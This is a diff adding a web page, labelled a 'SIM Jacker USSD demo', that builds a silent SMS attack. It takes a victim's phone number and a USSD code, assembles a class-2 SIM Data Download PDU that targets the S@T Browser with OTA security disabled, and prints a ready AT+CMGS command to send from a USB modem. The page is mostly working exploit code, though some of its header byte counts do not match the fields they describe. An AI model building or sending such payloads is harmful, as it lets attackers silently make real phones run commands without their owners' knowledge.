@@ -1,0 +1,265 @@
+
+<style>
+.pb-section { margin-bottom: 1.5rem; }
+.pb-label { font-size: 11px; font-weight: 500; color: var(--color-text-secondary); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 6px; }
+.pb-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 6px; }
+.pb-field { background: var(--color-background-secondary); border: 0.5px solid var(--color-border-tertiary); border-radius: 6px; padding: 6px 10px; font-size: 12px; font-family: var(--font-mono); }
+.pb-field .name { font-size: 10px; color: var(--color-text-tertiary); margin-bottom: 2px; font-family: var(--font-sans); }
+.pb-field .val { color: var(--color-text-primary); font-weight: 500; }
+.pb-field .meaning { font-size: 10px; color: var(--color-text-secondary); margin-top: 2px; font-family: var(--font-sans); }
+.pb-field.highlight { border-color: var(--color-border-success); background: var(--color-background-success); }
+.pb-field.highlight .val { color: var(--color-text-success); }
+.pb-field.danger { border-color: var(--color-border-danger); background: var(--color-background-danger); }
+.pb-field.danger .val { color: var(--color-text-danger); }
+.pb-field.warn { border-color: var(--color-border-warning); background: var(--color-background-warning); }
+.pb-field.warn .val { color: var(--color-text-warning); }
+.pb-field.info { border-color: var(--color-border-info); background: var(--color-background-info); }
+.pb-field.info .val { color: var(--color-text-info); }
+.section-header { font-size: 13px; font-weight: 500; color: var(--color-text-primary); border-bottom: 0.5px solid var(--color-border-tertiary); padding-bottom: 6px; margin-bottom: 10px; }
+.at-cmd { background: var(--color-background-secondary); border: 0.5px solid var(--color-border-tertiary); border-radius: 8px; padding: 12px 14px; font-family: var(--font-mono); font-size: 12px; color: var(--color-text-primary); word-break: break-all; line-height: 1.8; margin-top: 8px; }
+.at-cmd span { padding: 1px 3px; border-radius: 3px; cursor: pointer; }
+.leg { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }
+.leg-item { font-size: 11px; display: flex; align-items: center; gap: 4px; }
+.leg-dot { width: 8px; height: 8px; border-radius: 2px; }
+input[type=text] { font-family: var(--font-mono); font-size: 13px; padding: 6px 10px; border-radius: 6px; border: 0.5px solid var(--color-border-secondary); background: var(--color-background-primary); color: var(--color-text-primary); width: 160px; }
+</style>
+
+<h2 class="sr-only">SMS-Submit payload builder for SIM Jacker USSD demo</h2>
+
+<div style="padding: 1rem 0;">
+
+<div class="pb-section">
+  <div class="section-header">Your target number</div>
+  <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
+    <span style="font-size:13px;color:var(--color-text-secondary);">Victim phone number:</span>
+    <input type="text" id="phoneInput" value="923001234567" oninput="rebuild()" placeholder="923001234567" />
+    <span style="font-size:12px;color:var(--color-text-tertiary);">international, no +</span>
+  </div>
+  <div style="display:flex;align-items:center;gap:10px;">
+    <span style="font-size:13px;color:var(--color-text-secondary);">USSD code:</span>
+    <input type="text" id="ussdInput" value="*#06#" oninput="rebuild()" placeholder="*#06#" style="width:100px;" />
+  </div>
+</div>
+
+<div class="pb-section">
+  <div class="section-header">Layer 1 — SMS-Submit (outer wrapper)</div>
+  <div class="pb-row">
+    <div class="pb-field">
+      <div class="name">SCA</div>
+      <div class="val">00</div>
+      <div class="meaning">Use SIM's default SMSC</div>
+    </div>
+    <div class="pb-field warn">
+      <div class="name">FO (First Octet)</div>
+      <div class="val">41</div>
+      <div class="meaning">MTI=SMS-Submit, UDHI=1</div>
+    </div>
+    <div class="pb-field">
+      <div class="name">MR</div>
+      <div class="val">00</div>
+      <div class="meaning">Message reference</div>
+    </div>
+    <div class="pb-field info" id="da-field">
+      <div class="name">DA (Destination Address)</div>
+      <div class="val" id="da-val">...</div>
+      <div class="meaning">Victim's number encoded</div>
+    </div>
+    <div class="pb-field danger">
+      <div class="name">PID</div>
+      <div class="val">7F</div>
+      <div class="meaning">SIM Data Download — silent!</div>
+    </div>
+    <div class="pb-field danger">
+      <div class="name">DCS</div>
+      <div class="val">F6</div>
+      <div class="meaning">Class 2 — never shown to user</div>
+    </div>
+    <div class="pb-field" id="udl-field">
+      <div class="name">UDL</div>
+      <div class="val" id="udl-val">XX</div>
+      <div class="meaning">Total user data length</div>
+    </div>
+  </div>
+</div>
+
+<div class="pb-section">
+  <div class="section-header">Layer 2 — User Data Header (triggers SIM routing)</div>
+  <div class="pb-row">
+    <div class="pb-field">
+      <div class="name">UDHL</div>
+      <div class="val">02</div>
+      <div class="meaning">Header is 2 bytes long</div>
+    </div>
+    <div class="pb-field warn">
+      <div class="name">UDH</div>
+      <div class="val">70 00</div>
+      <div class="meaning">IEI=0x70 → security headers follow</div>
+    </div>
+  </div>
+</div>
+
+<div class="pb-section">
+  <div class="section-header">Layer 3 — OTA Command Packet (security + routing)</div>
+  <div class="pb-row">
+    <div class="pb-field" id="cpl-field">
+      <div class="name">CPL</div>
+      <div class="val" id="cpl-val">YYYY</div>
+      <div class="meaning">Total command packet length</div>
+    </div>
+    <div class="pb-field">
+      <div class="name">CHL</div>
+      <div class="val">0D</div>
+      <div class="meaning">Header = 13 bytes</div>
+    </div>
+    <div class="pb-field highlight">
+      <div class="name">SPI</div>
+      <div class="val">00 00</div>
+      <div class="meaning">NO security — the vulnerability</div>
+    </div>
+    <div class="pb-field highlight">
+      <div class="name">KIc</div>
+      <div class="val">00</div>
+      <div class="meaning">No encryption key</div>
+    </div>
+    <div class="pb-field highlight">
+      <div class="name">KID</div>
+      <div class="val">00</div>
+      <div class="meaning">No integrity key</div>
+    </div>
+    <div class="pb-field danger">
+      <div class="name">TAR</div>
+      <div class="val">50 53 48</div>
+      <div class="meaning">Target = S@T Browser</div>
+    </div>
+    <div class="pb-field">
+      <div class="name">CNTR</div>
+      <div class="val">00 00 00 00 00</div>
+      <div class="meaning">Counter (ignored, MSL=0)</div>
+    </div>
+    <div class="pb-field">
+      <div class="name">PCNTR</div>
+      <div class="val">00</div>
+      <div class="meaning">No padding</div>
+    </div>
+  </div>
+</div>
+
+<div class="pb-section">
+  <div class="section-header">Layer 4 — USAT Secured Data (the actual USSD command)</div>
+  <div class="pb-row" id="usat-fields">
+  </div>
+</div>
+
+<div class="pb-section">
+  <div class="section-header">Full AT command for USB modem</div>
+  <div style="font-size:12px;color:var(--color-text-secondary);margin-bottom:4px;">Copy this into your modem terminal (minicom / screen)</div>
+  <div class="at-cmd" id="at-cmd">Building...</div>
+  <div class="leg">
+    <div class="leg-item"><div class="leg-dot" style="background:var(--color-background-danger);border:1px solid var(--color-border-danger)"></div><span style="font-size:11px;color:var(--color-text-secondary);">Silent routing (PID+DCS)</span></div>
+    <div class="leg-item"><div class="leg-dot" style="background:var(--color-background-success);border:1px solid var(--color-border-success)"></div><span style="font-size:11px;color:var(--color-text-secondary);">No security (SPI/KIc/KID)</span></div>
+    <div class="leg-item"><div class="leg-dot" style="background:var(--color-background-warning);border:1px solid var(--color-border-warning)"></div><span style="font-size:11px;color:var(--color-text-secondary);">S@T Browser target (TAR)</span></div>
+    <div class="leg-item"><div class="leg-dot" style="background:var(--color-background-info);border:1px solid var(--color-border-info)"></div><span style="font-size:11px;color:var(--color-text-secondary);">USSD payload</span></div>
+  </div>
+</div>
+
+</div>
+
+<script>
+function encodePhone(num) {
+  let digits = num.replace(/\D/g,'');
+  let len = digits.length;
+  let ton = '91';
+  if(digits.length % 2 !== 0) digits += 'F';
+  let swapped = '';
+  for(let i=0;i<digits.length;i+=2) swapped += digits[i+1]+digits[i];
+  return { lenHex: len.toString(16).padStart(2,'0').toUpperCase(), encoded: ton+swapped.toUpperCase() };
+}
+
+function encodeUssd(ussd) {
+  const chars = ussd.split('');
+  let bits = '';
+  for(let c of chars) bits += c.charCodeAt(0).toString(2).padStart(7,'0').split('').reverse().join('');
+  while(bits.length%8!==0) bits+='0';
+  let hex='';
+  for(let i=0;i<bits.length;i+=8) hex+=parseInt(bits.slice(i,i+8).split('').reverse().join(''),2).toString(16).padStart(2,'0').toUpperCase();
+  return hex;
+}
+
+function toHexLen(n) { return n.toString(16).padStart(2,'0').toUpperCase(); }
+
+function rebuild() {
+  const phone = document.getElementById('phoneInput').value || '923001234567';
+  const ussd = document.getElementById('ussdInput').value || '*#06#';
+
+  const ph = encodePhone(phone);
+  document.getElementById('da-val').textContent = ph.lenHex + ' ' + ph.encoded.match(/.{1,2}/g).join(' ');
+
+  const ussdEncoded = encodeUssd(ussd);
+  const ussdByteCount = ussdEncoded.length/2;
+  const ussdLen = toHexLen(ussdByteCount + 1);
+
+  const usatFields = document.getElementById('usat-fields');
+  usatFields.innerHTML = `
+    <div class="pb-field info">
+      <div class="name">D0 — proactive command tag</div>
+      <div class="val">D0</div>
+      <div class="meaning">"SIM is ordering phone to act"</div>
+    </div>
+    <div class="pb-field">
+      <div class="name">Length</div>
+      <div class="val">${toHexLen(10 + ussdByteCount)}</div>
+      <div class="meaning">Bytes that follow</div>
+    </div>
+    <div class="pb-field info">
+      <div class="name">Command details (81 03)</div>
+      <div class="val">81 03 01 12 00</div>
+      <div class="meaning">Cmd #1, type=SEND USSD (0x12)</div>
+    </div>
+    <div class="pb-field">
+      <div class="name">Device IDs (82 02)</div>
+      <div class="val">82 02 81 83</div>
+      <div class="meaning">SIM → Network</div>
+    </div>
+    <div class="pb-field info">
+      <div class="name">USSD string (85 ${ussdLen})</div>
+      <div class="val">85 ${ussdLen} 91 ${ussdEncoded.match(/.{1,2}/g).join(' ')}</div>
+      <div class="meaning">"${ussd}" in GSM 7-bit</div>
+    </div>`;
+
+  const usatPayload = 'D0' + toHexLen(10+ussdByteCount) + '810301120082028183' + '85' + ussdLen + '91' + ussdEncoded;
+  const usatBytes = usatPayload.length/2;
+
+  const otaHeader = '0D000000000050534800000000';
+  const otaHeaderBytes = otaHeader.length/2;
+  const cpPayload = toHexLen(otaHeaderBytes + usatBytes) + otaHeader + usatPayload;
+  const udhPayload = '027000';
+  const udBytes = (udhPayload.length/2) + (cpPayload.length/2);
+
+  document.getElementById('udl-val').textContent = toHexLen(udBytes);
+
+  const cplVal = toHexLen(otaHeaderBytes + usatBytes);
+  document.getElementById('cpl-val').textContent = cplVal;
+
+  const da = ph.lenHex + ph.encoded;
+  const fullPdu = '00' + '41' + '00' + da + '7F' + 'F6' + toHexLen(udBytes) + udhPayload + cpPayload;
+  const pduLen = (fullPdu.length/2) - 1;
+
+  const ussdE = ussdEncoded.match(/.{1,2}/g).join(' ');
+  const atCmd = document.getElementById('at-cmd');
+  atCmd.innerHTML =
+    'AT+CMGS=' + pduLen + '<br>' +
+    '<span style="color:var(--color-text-secondary)">00 41 00 </span>' +
+    '<span style="background:var(--color-background-info);color:var(--color-text-info);border-radius:3px;padding:1px 3px">' + ph.lenHex + ' ' + ph.encoded.match(/.{1,2}/g).join(' ') + '</span> ' +
+    '<span style="background:var(--color-background-danger);color:var(--color-text-danger);border-radius:3px;padding:1px 3px">7F F6</span> ' +
+    toHexLen(udBytes) + ' ' +
+    '<span style="color:var(--color-text-secondary)">02 70 00 </span>' +
+    cplVal + ' ' +
+    '<span style="background:var(--color-background-success);color:var(--color-text-success);border-radius:3px;padding:1px 3px">0D 00 00 00 00</span> ' +
+    '<span style="background:var(--color-background-warning);color:var(--color-text-warning);border-radius:3px;padding:1px 3px">50 53 48</span> ' +
+    '<span style="color:var(--color-text-secondary)">00 00 00 00 00 00 </span>' +
+    '<span style="background:var(--color-background-info);color:var(--color-text-info);border-radius:3px;padding:1px 3px">D0 ' + toHexLen(10+ussdByteCount) + ' 81 03 01 12 00 82 02 81 83 85 ' + ussdLen + ' 91 ' + ussdEncoded.match(/.{1,2}/g).join(' ') + '</span>' +
+    '<br><span style="color:var(--color-text-tertiary);font-size:11px;">Press Ctrl+Z to send</span>';
+}
+
+rebuild();
+</script>
